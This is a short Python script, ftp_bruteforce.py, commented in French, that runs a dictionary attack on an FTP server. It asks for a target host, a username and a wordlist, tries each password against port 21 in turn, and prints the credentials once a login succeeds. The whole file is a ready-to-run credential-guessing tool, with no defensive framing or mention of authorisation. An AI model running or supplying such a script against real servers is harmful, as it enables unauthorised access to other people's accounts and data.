# ftp_bruteforce.py
from ftplib import FTP
import socket

# Entrée utilisateur
target = input("Adresse du serveur FTP (ex: 192.168.1.10 ou ftp.exemple.com) : ")
username = input("Nom d'utilisateur à tester : ")
wordlist_path = input("Chemin vers la wordlist (ex: mylist.txt) : ")

# Flag pour savoir si on a réussi
found = False

try:
    with open(wordlist_path, 'r', encoding='latin-1') as wordlist:
        print("\n🚀 Démarrage du bruteforce...\n")

        for password in wordlist:
            password = password.strip()
            print(f"⏳ Test : {username}:{password}")

            try:
                ftp = FTP()
                ftp.connect(target, 21, timeout=5)
                ftp.login(user=username, passwd=password)

                print(f"\n✅ Succès ! Identifiants valides : {username}:{password}")
                ftp.quit()
                found = True
                break

            except Exception:
                pass  # on continue si ça échoue

        if not found:
            print("\n❌ Aucun mot de passe trouvé dans la wordlist.")

except FileNotFoundError:
    print("❌ Wordlist introuvable. Vérifie le chemin.")
except socket.gaierror:
    print("❌ Erreur : le serveur FTP est inaccessible ou invalide.")
except Exception as e:
    print(f"❌ Une erreur est survenue : {e}")
